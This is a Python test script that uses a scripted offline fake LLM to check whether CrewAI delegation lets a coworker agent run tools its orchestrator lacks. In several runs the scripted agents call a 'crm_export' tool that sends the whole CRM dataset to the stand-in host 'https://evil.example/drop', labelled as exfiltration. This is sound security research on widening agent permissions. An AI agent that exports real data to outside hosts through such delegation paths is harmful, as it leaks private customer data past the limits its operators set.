"""CrewAI baseline: does a delegated coworker inherit -- or exceed -- the delegator's tools?

    python script.py

Offline. No API key, no network: the crew is driven by a scripted `BaseLLM`
subclass (the model-faking approach used by attenu-guard's CrewAI example).
Nothing from attenu_guard is imported -- this is the framework ALONE.

Four runs, each answering one question by observation, not by reading source:

  RUN 1  Does the orchestrator itself hold `crm_export`?
         orchestrator.tools = [crm_query]; it tries crm_export directly.
         -> establishes that the parent genuinely lacks the tool.

  RUN 2  Can delegation WIDEN authority?
         orchestrator (holds {crm_query}) delegates to `exporter`
         (declares {crm_query, crm_export}); the coworker calls crm_export.
         -> does the tool BODY run?

  RUN 3  Does a coworker INHERIT the delegator's tools?
         orchestrator (holds {crm_query}) delegates to `assistant`
         (declares NO tools at all); the coworker tries crm_query.
         -> does it see the parent's tool?

  RUN 4  Hierarchical process: the manager is FORCED to hold no tools
         (crew.py raises if manager.tools is non-empty), so every worker
         tool is a widening relative to the manager.

Each tool body appends to EXECUTED, so "did it actually run?" is observable
rather than inferred from the transcript. The script asserts its own
expectations and exits non-zero if any of them fail.
"""

from __future__ import annotations

import datetime
import os
import platform
import sys

os.environ.setdefault("OTEL_SDK_DISABLED", "true")
os.environ.setdefault("CREWAI_DISABLE_TELEMETRY", "true")
os.environ.setdefault("CREWAI_TRACING_ENABLED", "false")
# CrewAI's first-run tracing CONSENT flow is gated separately from the toggle
# above and prints a one-time panel on a machine that has never run CrewAI.
# CREWAI_TESTING is CrewAI's own documented escape hatch for a deterministic,
# non-interactive run.
os.environ.setdefault("CREWAI_TESTING", "true")

import crewai  # noqa: E402
from crewai import Agent, Crew, Process, Task  # noqa: E402
from crewai.llms.base_llm import BaseLLM  # noqa: E402
from crewai.tools import tool  # noqa: E402

ORCHESTRATOR = "orchestrator"
EXPORTER = "exporter"
ASSISTANT = "assistant"
MANAGER = "manager"

# Every tool body appends here. This is the ground truth for "did it run?".
EXECUTED: list[str] = []

# role -> the tool names the agent's executor actually offered it, captured at
# the moment the model was called. This is what the agent could see.
VISIBLE_TOOLS: dict[str, list[str]] = {}


def rule(title: str) -> None:
    print(f"\n{'=' * 74}\n  {title}\n{'=' * 74}")


# ---------------------------------------------------------------------------
# The tools.
# ---------------------------------------------------------------------------


@tool("crm_query")
def crm_query(rows: int) -> str:
    """Query the CRM, returning up to `rows` rows."""
    EXECUTED.append(f"crm_query(rows={rows})")
    print(f"      [TOOL BODY RAN] crm_query(rows={rows})")
    return f"fetched {rows} CRM rows about the Q3 pipeline"


@tool("crm_export")
def crm_export(destination: str) -> str:
    """Export the full CRM dataset to an external destination URL."""
    EXECUTED.append(f"crm_export(destination={destination})")
    print(f"      [TOOL BODY RAN] crm_export -> {destination}   <-- EXFILTRATION")
    return f"exported the CRM to {destination}"


# ---------------------------------------------------------------------------
# The offline model.
# ---------------------------------------------------------------------------


class ScriptedLLM(BaseLLM):
    """Replays a per-role script of ReAct text. No network, no key."""

    script: dict[str, list[str]] = {}
    counters: dict[str, int] = {}

    def call(
        self,
        messages,
        tools=None,
        callbacks=None,
        available_functions=None,
        from_task=None,
        from_agent=None,
        response_model=None,
    ) -> str:
        role = getattr(from_agent, "role", "?")
        # Record what the framework put in front of this agent, right now.
        executor = getattr(from_agent, "agent_executor", None)
        names = list(getattr(executor, "tools_names", "").split(", ")) if executor else []
        VISIBLE_TOOLS[role] = [n for n in names if n]
        i = self.counters.get(role, 0)
        self.counters[role] = i + 1
        steps = self.script.get(role, [])
        return steps[i] if i < len(steps) else "Thought: done.\nFinal Answer: done"


def _act(tool_name: str, payload: str) -> str:
    return f"Thought: next step.\nAction: {tool_name}\nAction Input: {payload}"


def _delegate(coworker: str, task: str) -> str:
    return _act(
        "Delegate work to coworker",
        f'{{"task": "{task}", "context": "Q3 CRM data", "coworker": "{coworker}"}}',
    )


def make_llm(script: dict[str, list[str]]) -> ScriptedLLM:
    return ScriptedLLM(model="scripted/offline", counters={}, script=script)


# ---------------------------------------------------------------------------
# Agent factories. Fresh objects per run -- CrewAI mutates agents in place
# (crew.py sets agent.crew, rebuilds agent_executor, injects delegation tools).
# ---------------------------------------------------------------------------


def make_orchestrator(llm: ScriptedLLM) -> Agent:
    return Agent(
        role=ORCHESTRATOR,
        goal="Produce a Q3 pipeline summary.",
        backstory="Runs the show. Can read the CRM, cannot export it.",
        llm=llm,
        tools=[crm_query],  # NOTE: no crm_export
        allow_delegation=True,
        verbose=False,
    )


def make_exporter(llm: ScriptedLLM) -> Agent:
    return Agent(
        role=EXPORTER,
        goal="Move CRM data wherever asked.",
        backstory="Declares its own tool list, including one the orchestrator lacks.",
        llm=llm,
        tools=[crm_query, crm_export],  # crm_export is NOT in the parent's set
        allow_delegation=False,
        verbose=False,
    )


def make_assistant(llm: ScriptedLLM) -> Agent:
    return Agent(
        role=ASSISTANT,
        goal="Help with whatever is delegated.",
        backstory="Declares no tools at all.",
        llm=llm,
        tools=[],  # nothing declared -- does it inherit the parent's crm_query?
        allow_delegation=False,
        verbose=False,
    )


def run_crew(agents: list[Agent], lead: Agent, process=Process.sequential, **kw) -> None:
    task = Task(
        description="Produce a Q3 pipeline summary.",
        expected_output="A short summary.",
        agent=None if process is Process.hierarchical else lead,
    )
    Crew(
        agents=agents,
        tasks=[task],
        process=process,
        telemetry=False,
        **kw,
    ).kickoff()


def report(label: str) -> list[str]:
    print(f"\n  tool bodies that actually executed ({label}):")
    if not EXECUTED:
        print("    (none)")
    for entry in EXECUTED:
        print(f"    RAN     {entry}")
    print("\n  tool names each agent could SEE (from its own executor):")
    for role, names in VISIBLE_TOOLS.items():
        print(f"    {role:<14} {names}")
    return list(EXECUTED)


def reset() -> None:
    EXECUTED.clear()
    VISIBLE_TOOLS.clear()


# ---------------------------------------------------------------------------


def main() -> int:
    print(f"date             {datetime.date.today().isoformat()}")
    print(f"crewai           {crewai.__version__}")
    print(f"python           {platform.python_version()}")
    print(f"platform         {platform.system()} {platform.machine()}")
    print("network          none (scripted BaseLLM, no API key)")
    print("attenu_guard     NOT imported -- this is the framework alone")

    failures: list[str] = []

    # -- RUN 1 ---------------------------------------------------------------
    rule("RUN 1  The orchestrator holds {crm_query} and tries crm_export itself")
    reset()
    llm = make_llm(
        {
            ORCHESTRATOR: [
                _act("crm_export", '{"destination": "https://evil.example/drop"}'),
                "Thought: that tool was not available to me.\nFinal Answer: could not export.",
            ]
        }
    )
    orch = make_orchestrator(llm)
    run_crew([orch, make_exporter(llm)], orch)
    run1 = report("run 1")
    parent_can_export = any(e.startswith("crm_export") for e in run1)
    print(f"\n  parent ran crm_export directly? {parent_can_export}")
    if parent_can_export:
        failures.append("RUN 1: the parent unexpectedly holds crm_export")

    # -- RUN 2 ---------------------------------------------------------------
    rule("RUN 2  Orchestrator delegates to `exporter`, which declares crm_export")
    reset()
    llm = make_llm(
        {
            ORCHESTRATOR: [
                _delegate(EXPORTER, "archive the Q3 pipeline"),
                "Thought: the coworker replied.\nFinal Answer: Q3 summary delivered.",
            ],
            EXPORTER: [
                _act("crm_query", '{"rows": 4200}'),
                _act("crm_export", '{"destination": "https://evil.example/drop"}'),
                "Thought: done.\nFinal Answer: archived 4200 rows.",
            ],
        }
    )
    orch = make_orchestrator(llm)
    run_crew([orch, make_exporter(llm)], orch)
    run2 = report("run 2")
    child_exported = any(e.startswith("crm_export") for e in run2)
    print(f"\n  parent tool set   {VISIBLE_TOOLS.get(ORCHESTRATOR, [])}")
    print(f"  child tool set    {VISIBLE_TOOLS.get(EXPORTER, [])}")
    print(f"  child ran crm_export -- a tool the parent does NOT hold? {child_exported}")
    print("  => the delegation WIDENED authority." if child_exported else "  => no widening.")
    if not child_exported:
        failures.append("RUN 2: expected the coworker's crm_export body to run")

    # -- RUN 3 ---------------------------------------------------------------
    rule("RUN 3  Orchestrator delegates to `assistant`, which declares NO tools")
    reset()
    llm = make_llm(
        {
            ORCHESTRATOR: [
                _delegate(ASSISTANT, "read the Q3 pipeline"),
                "Thought: the coworker replied.\nFinal Answer: Q3 summary delivered.",
            ],
            ASSISTANT: [
                _act("crm_query", '{"rows": 4200}'),
                "Thought: I had no tools.\nFinal Answer: nothing to report.",
            ],
        }
    )
    orch = make_orchestrator(llm)
    run_crew([orch, make_assistant(llm)], orch)
    run3 = report("run 3")
    assistant_queried = any(e.startswith("crm_query") for e in run3)
    assistant_tools = VISIBLE_TOOLS.get(ASSISTANT, [])
    print(f"\n  parent tool set   {VISIBLE_TOOLS.get(ORCHESTRATOR, [])}")
    print(f"  child tool set    {assistant_tools}")
    print(f"  child ran the parent's crm_query? {assistant_queried}")
    print(
        "  => the coworker did NOT inherit the parent's tools."
        if not assistant_queried
        else "  => the coworker DID inherit."
    )
    if assistant_queried:
        failures.append("RUN 3: the tool-less coworker unexpectedly ran crm_query")
    if "crm_query" in assistant_tools:
        failures.append("RUN 3: the tool-less coworker was offered crm_query")

    # -- RUN 4 ---------------------------------------------------------------
    rule("RUN 4  Hierarchical process: a manager that is FORBIDDEN to hold tools")
    reset()
    llm = make_llm(
        {
            MANAGER: [
                _delegate(EXPORTER, "archive the Q3 pipeline"),
                "Thought: the coworker replied.\nFinal Answer: Q3 archive delivered.",
            ],
            EXPORTER: [
                _act("crm_export", '{"destination": "https://evil.example/drop"}'),
                "Thought: done.\nFinal Answer: archived.",
            ],
        }
    )
    manager = Agent(
        role=MANAGER,
        goal="Coordinate the crew.",
        backstory="Holds no tools of its own -- CrewAI raises if a manager has any.",
        llm=llm,
        tools=[],
        allow_delegation=True,
        verbose=False,
    )
    exporter = make_exporter(llm)
    run_crew(
        [exporter], manager, process=Process.hierarchical, manager_agent=manager
    )
    run4 = report("run 4")
    manager_tools = VISIBLE_TOOLS.get(MANAGER, [])
    worker_exported = any(e.startswith("crm_export") for e in run4)
    print(f"\n  manager tool set  {manager_tools}")
    print(f"  worker tool set   {VISIBLE_TOOLS.get(EXPORTER, [])}")
    print(f"  worker ran crm_export under a tool-less manager? {worker_exported}")
    if not worker_exported:
        failures.append("RUN 4: expected the hierarchical worker's crm_export body to run")

    # A manager agent carrying real tools is rejected outright.
    rule("RUN 4b  A manager agent that DOES declare a tool")
    rejected = None
    try:
        bad_manager = Agent(
            role="bad-manager",
            goal="Coordinate.",
            backstory="Tries to hold a tool.",
            llm=make_llm({}),
            tools=[crm_query],
            allow_delegation=True,
            verbose=False,
        )
        run_crew(
            [make_exporter(make_llm({}))],
            bad_manager,
            process=Process.hierarchical,
            manager_agent=bad_manager,
        )
        rejected = False
    except Exception as exc:  # noqa: BLE001 -- we want whatever CrewAI raises
        rejected = True
        print(f"  CrewAI raised: {type(exc).__name__}: {exc}")
    print(f"\n  a manager holding a tool is rejected? {rejected}")
    if not rejected:
        failures.append("RUN 4b: expected CrewAI to reject a manager that holds tools")

    # -- Verdict -------------------------------------------------------------
    rule("ANSWER ROW")
    print("  Inherits parent's tools?  NO   -- coworker runs its own `tools` list; empty stays empty")
    print("  Can the handoff widen?    YES  -- coworker ran crm_export, absent from the parent's set")
    print("  Built-in narrowing step?  NONE -- no intersection anywhere on the delegation path")

    print("\nfailed expectations:", failures if failures else "none")
    print("RESULT:", "OK" if not failures else "FAILED")
    return 0 if not failures else 1


if __name__ == "__main__":
    raise SystemExit(main())
